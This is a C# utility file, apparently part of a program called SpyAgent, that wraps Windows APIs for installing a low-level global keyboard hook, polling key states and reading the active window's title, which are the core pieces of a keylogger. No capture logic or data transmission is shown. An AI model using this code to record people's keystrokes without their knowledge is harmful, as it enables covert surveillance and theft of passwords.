namespace SpyAgent.Utils;

using System.Runtime.InteropServices;
using System.Text;

internal static class NativeHooks
{
    public static string GetActiveWindowTitle()
    {
        var hwnd = GetForegroundWindow();
        if (hwnd == IntPtr.Zero)
            return "";

        var sb = new StringBuilder(256);
        var length = GetWindowText(hwnd, sb, sb.Capacity);
        return length > 0 ? sb.ToString() : "";
    }

    public static short GetKeyState(int virtualKey)
    {
        return GetAsyncKeyState(virtualKey);
    }

    public static IntPtr SetKeyboardHook(LowLevelKeyboardProc callback)
    {
        using var process = System.Diagnostics.Process.GetCurrentProcess();
        using var module = process.MainModule!;
        return SetWindowsHookEx(13, callback, GetModuleHandle(module.ModuleName), 0);
    }

    public static bool RemoveHook(IntPtr hookId)
    {
        return UnhookWindowsHookEx(hookId);
    }

    public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll")]
    private static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

    [DllImport("user32.dll")]
    private static extern short GetAsyncKeyState(int vKey);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
}
